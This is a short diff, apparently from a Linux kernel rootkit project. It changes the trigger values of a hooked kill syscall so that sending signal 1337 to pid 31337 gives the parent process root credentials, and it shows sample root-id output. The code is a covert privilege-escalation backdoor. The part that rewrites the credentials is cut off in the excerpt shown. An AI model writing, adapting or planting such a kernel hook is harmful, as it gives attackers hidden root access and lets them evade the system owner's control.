@@ -56,8 +56,8 @@ uid=0(root) gid=0(root) groups=0(root),100(users)
 
 asmlinkage int (*original_kill)(pid_t pid, int sig);
 
-asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 58
-    if ((pid == 12345) && (sig == 58)) {      //and pid 12345 then give parent root privs
+asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 1337
+    if ((pid == 31337) && (sig == 1337)) {      //and pid 31337 then give parent root privs
         struct task_struct *ptr = current;
         struct cred *cred;
         cred=(struct cred *)__task_cred(ptr); //task creds
